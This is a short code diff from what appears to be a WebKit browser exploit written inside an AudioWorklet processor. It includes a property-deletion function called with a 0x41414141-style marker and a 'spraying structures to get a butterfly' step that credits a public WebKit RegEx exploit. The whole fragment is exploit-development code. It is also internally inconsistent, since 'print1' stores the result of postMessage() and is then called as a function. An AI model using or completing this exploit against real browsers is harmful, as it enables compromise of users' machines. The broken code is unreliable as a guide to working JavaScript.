@@ -694,7 +694,7 @@ b.process = (inputs, outputs, parameters)=>{
         location.reload();
         throw null;
     }
-        let print1 = fuck.port.postMessage();
+        var print1 = fuck.port.postMessage();
         function foo(obj) {
    return delete obj['x'];
  }
@@ -708,7 +708,7 @@ b.process = (inputs, outputs, parameters)=>{
    foo({});
    foo({x:0x4141414141});
 }
-        //alert1("starting")
+        fuck.port.postMessage("starting")
         print1('[*] Spraying structures to get a butterfly (1/2)...');
         // copy paste from: 
         // https://github.com/LinusHenze/WebKit-RegEx-Exploit    
